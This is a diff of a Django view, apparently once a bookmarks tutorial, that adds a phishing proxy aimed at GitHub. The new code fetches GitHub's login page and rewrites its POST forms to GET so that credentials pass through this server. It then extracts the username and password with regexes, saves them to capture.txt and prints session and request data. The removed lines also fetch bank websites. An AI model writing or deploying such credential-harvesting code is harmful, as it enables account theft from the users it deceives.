@@ -2,27 +2,27 @@
 from django.http import HttpResponse
 import urllib2
 import requests
+import re
+import sys
 def main_page(request):
-    req = urllib2.Request('http://web.mit.edu/6.033/www/schedule.shtml')
-    response = urllib2.urlopen('https://www.bankofamerica.com')
-    '''output = u
-       <html>
-         <head><title>%s</title></head>
-         <body>
-           <h1>%s</h1><p>%s</p>
-         </body>
-       </html>
-        % (
-       u'Django Bookmarks',
-       u'Welcome to Django Bookmarks',
-       u'Where you can store and share bookmarks!'
-       )'''
-    #req = urllib2.Request('https://online.citibank.com/')
-    #response = urllib2.urlopen(req)
-    the_page = response.read()
-    r = requests.get('http://www.github.com/login')
-    return HttpResponse(r.text)
+    print request.session.items()
+    print request.META
+    print request.path
+    if request.method == 'GET' and re.search('(?<=password=)\w+',request.body) !=  None:
+        print re.search('(?<=password=)\w+',request.text).group(0) 
+    return HttpResponse(seeGitHubPass(request))
 
+def seeGitHubPass(request):
+    if request.method == 'GET' and re.search('(?<=password=)\w+',request.META['QUERY_STRING']) !=  None:
+        with open('capture.txt','w') as f:
+            f.write('username: {0:s} \n'.format(re.search('(?<=login=)\w+',request.META['QUERY_STRING']).group(0)))
+            f.write('password: {0:s} \n'.format(re.search('(?<=password=)\w+',request.META['QUERY_STRING']).group(0)))
+    url = 'http://www.github.com/login'
+    if re.search('(?<=action=/session)',request.body) != None:
+        url = 'http://www.github.com/'
+    r = requests.get(url)
+    replacePost = re.sub(r'post','get',r.text,flags=re.IGNORECASE)
+    return replacePost
 
 
 
